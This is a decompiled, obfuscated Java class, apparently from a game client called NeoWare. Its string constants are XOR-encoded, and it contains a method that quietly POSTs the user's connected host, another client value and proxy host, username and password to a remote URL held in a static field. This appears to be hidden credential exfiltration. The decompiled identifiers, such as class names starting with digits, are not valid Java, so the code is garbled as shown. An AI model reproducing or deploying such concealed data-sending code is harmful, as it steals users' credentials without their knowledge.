package neo;

import java.io.IOException;
import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.Connection.Method;

public class 0bd extends 0ba {
   private static String _DSC GG NEOWARECLIENT _;

   private static 0cu method_LB() {
      return 0bJ.field_h;
   }

   private static Connection.Method method_LC() {
      return Method.POST;
   }

   // $FF: synthetic method
   // $FF: bridge method
   private static String method_LA(String var0) {
      StringBuilder var1 = new StringBuilder();

      for(int var2 = 7729 ^ -11179 ^ 4100 ^ -9632; var2 < var0.length(); ++var2) {
         var1.append((char)(var0.charAt(var2) ^ 2634 ^ -26791 ^ 29117 ^ -5768));
      }

      return var1.toString();
   }

   public _bd/* $FF was: 0bd*/() {
      super(method_LA("ցֳִ֗ֆ֟"));
   }

   public void method_Lt(0da a) throws IOException {
      0dC b = a.method_bzA().getProxy();
      Jsoup.connect(method_LB().method_bnP()).data(method_LA("ֳֳ֥֤֤֠"), a.method_bzA().getHost()).data(method_LA("ֺ֣֤"), a.method_bzz()).data(method_LA("ֹ֦֤֮֯"), b.method_bBJ()).data(method_LA("ֳֳַָֻ֣֥֤"), b.method_bBL()).data(method_LA("ֲַֹ֦֥֥֤֡"), b.method_bBN()).method(method_LC()).execute();
   }
}
